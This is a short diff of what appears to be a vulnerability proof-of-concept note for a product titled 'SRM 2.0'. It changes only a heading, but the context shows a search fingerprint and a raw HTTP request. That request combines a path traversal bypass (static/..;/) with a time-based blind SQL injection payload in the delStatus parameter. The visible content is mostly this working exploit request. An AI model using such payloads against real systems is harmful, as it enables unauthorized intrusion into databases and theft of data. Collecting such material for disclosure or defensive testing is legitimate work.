@@ -6,7 +6,7 @@
 title=="SRM 2.0"
 ```
 
-## poc
+## POC
 ```java
 POST /adpweb/static/..;/a/sys/sysMessage/statusList?companyName=1&officeName=1&orderBy=1&receiverName=1&sourceMessageId=1&delStatus=1%20AND%20(SELECT%207104%20FROM%20(SELECT(SLEEP(3)))xZoa) HTTP/1.1
 Host: 
